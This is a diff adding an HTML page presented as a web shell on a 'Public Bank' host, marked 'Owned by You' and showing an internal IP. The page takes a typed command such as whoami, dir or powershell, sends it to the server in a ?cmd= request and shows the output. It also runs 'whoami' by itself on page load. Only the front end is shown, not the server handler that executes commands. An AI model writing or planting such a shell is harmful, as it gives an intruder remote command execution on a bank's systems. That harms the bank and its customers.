@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>💀 Public Bank - Web Shell</title>
+    <style>
+        body { 
+            font-family: 'Courier New', monospace; 
+            background: #000; 
+            color: #0f0; 
+            padding: 20px; 
+            margin: 0;
+        }
+        h1 { color: #0f0; }
+        input { 
+            width: 70%; 
+            padding: 15px; 
+            font-size: 18px; 
+            background: #111; 
+            color: #0f0; 
+            border: 2px solid #0f0; 
+        }
+        button { 
+            padding: 15px 30px; 
+            font-size: 18px; 
+            background: #c00; 
+            color: white; 
+            border: none; 
+            cursor: pointer;
+        }
+        pre { 
+            background: #111; 
+            padding: 20px; 
+            min-height: 300px; 
+            overflow: auto; 
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <h1>💀 Public Bank Web Shell - Owned by You</h1>
+    <p><strong>IP:</strong> 192.168.45.1</p>
+
+    <input type="text" id="cmd" placeholder="whoami   or   dir   or   powershell" autofocus>
+    <button onclick="runCommand()">Execute Command</button>
+
+    <pre id="output">Waiting for command...</pre>
+
+    <script>
+        async function runCommand() {
+            const cmdInput = document.getElementById('cmd');
+            const output = document.getElementById('output');
+            const cmd = cmdInput.value.trim();
+
+            if (!cmd) return;
+
+            output.textContent = `> ${cmd}\n\nExecuting...\n`;
+
+            try {
+                const response = await fetch(window.location.pathname + "?cmd=" + encodeURIComponent(cmd), {
+                    method: 'GET',
+                    headers: { 'Cache-Control': 'no-cache' }
+                });
+
+                const result = await response.text();
+                output.textContent += result || "No output";
+            } catch (err) {
+                output.textContent += "Error: " + err.message;
+            }
+
+            cmdInput.value = '';
+            cmdInput.focus();
+        }
+
+        // Press Enter to execute
+        document.getElementById('cmd').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                runCommand();
+            }
+        });
+
+        // Auto test command
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('cmd').value = "whoami";
+                runCommand();
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
